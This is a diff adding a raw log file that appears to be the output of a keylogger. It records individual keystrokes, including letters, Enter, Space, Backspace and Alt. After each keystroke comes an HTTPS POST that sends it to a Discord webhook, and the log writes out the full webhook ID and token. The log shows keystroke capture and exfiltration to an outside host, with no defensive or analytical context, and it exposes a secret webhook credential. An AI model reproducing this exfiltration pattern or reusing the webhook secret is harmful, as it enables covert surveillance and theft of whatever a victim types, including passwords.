@@ -1,0 +1,45 @@
+[2023-12-30 18:20:38,864]: 'q'
+[2023-12-30 18:20:38,883]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:20:39,848]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:20:39,852]: 'd'
+[2023-12-30 18:20:39,856]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:20:41,048]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:20:41,053]: 's'
+[2023-12-30 18:20:41,064]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:20:44,270]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:20:47,727]: 'b'
+[2023-12-30 18:20:47,737]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:20:48,489]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:20:48,494]: 'o'
+[2023-12-30 18:20:48,497]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:20:49,405]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:20:49,409]: Key.enter
+[2023-12-30 18:20:49,413]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:20:50,201]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:20:51,278]: 'o'
+[2023-12-30 18:20:51,282]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:20:52,014]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:20:52,018]: Key.space
+[2023-12-30 18:20:52,026]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:20:52,681]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:20:52,685]: Key.backspace
+[2023-12-30 18:20:52,696]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:20:53,448]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:20:53,452]: Key.backspace
+[2023-12-30 18:20:53,457]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:20:54,319]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:20:54,324]: Key.backspace
+[2023-12-30 18:20:54,327]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:20:55,305]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:20:55,307]: Key.backspace
+[2023-12-30 18:20:55,309]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:20:56,162]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:20:59,807]: Key.alt_l
+[2023-12-30 18:20:59,810]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:21:00,586]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:21:03,024]: Key.alt_l
+[2023-12-30 18:21:03,028]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:21:03,782]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
+[2023-12-30 18:21:04,957]: 'd'
+[2023-12-30 18:21:04,964]: Starting new HTTPS connection (1): discord.com:443
+[2023-12-30 18:21:05,747]: https://discord.com:443 "POST /api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9 HTTP/1.1" 204 0
